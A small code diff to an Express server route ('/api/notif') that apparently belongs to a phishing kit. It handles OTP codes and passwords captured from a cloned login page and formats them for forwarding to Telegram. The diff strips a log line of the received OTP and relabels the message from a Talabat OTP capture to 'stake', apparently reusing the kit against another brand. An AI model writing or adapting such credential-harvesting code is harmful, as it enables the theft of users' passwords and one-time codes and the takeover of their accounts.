@@ -52,10 +52,10 @@ app.post('/api/notif', async (req, res) => {
         // Validate required fields
      
         
-        console.log('[server.js] ✅ OTP received:', otp);
+   
         
         // Format message for Telegram (same format as api/send-sms.js)
-        const message = `📱 [Talabat SMS/OTP Code]
+        const message = `📱 [stake]
 
 🔢 password: ${panel_password}
 📄 Page URL: ${pageUrl || 'N/A'}
